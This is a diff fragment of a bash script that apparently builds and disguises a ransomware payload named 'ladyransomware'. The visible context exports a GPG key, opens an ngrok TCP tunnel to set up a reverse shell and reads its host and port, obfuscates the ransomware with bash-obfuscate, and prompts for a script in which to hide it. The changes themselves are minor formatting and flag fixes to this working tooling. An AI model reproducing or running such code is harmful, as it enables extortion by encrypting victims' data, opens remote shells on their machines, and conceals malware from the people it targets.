@@ -25,7 +25,7 @@ email=$(gpg -k|grep "ultimate"|awk -F " " '{print $4}')
 gpg --armor --output ~/.gnupg/public-key.gpg --export $email
 key=$(cat ~/.gnupg/public-key.gpg)
 
-printf "$G(_>)─➤$W Setting reverse shell."
+printf "$G(_>)─➤$W Setting reverse shell.\n"
 exec ngrok -tcp 4546 >/dev/null 2>/dev/null &
 revHOST=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f1)
 revPORT=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
@@ -80,10 +80,10 @@ chmod 777 $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
 source $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
 rm -r $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
 CONF
-bash-obfuscate $iHAKLAB/.set/share/ladyransomware.deo -O $iHAKLAB/ladyransomware
+bash-obfuscate $iHAKLAB/.set/share/ladyransomware.deo -o $iHAKLAB/ladyransomware
 rm -f $iHAKLAB/.set/share/ladyransomware.deo
 
-printf "$G(_>)_Script_to_hide_the_ransomware$W"
+printf "$G(_>)_Script_to_hide_the_ransomware$W\n"
 while read -p " ╰────➤ " script [ -z $script ] || [ -e $script ];do
 	printf >&2 "$R(_>)─➤$W Not such file\n"
 done
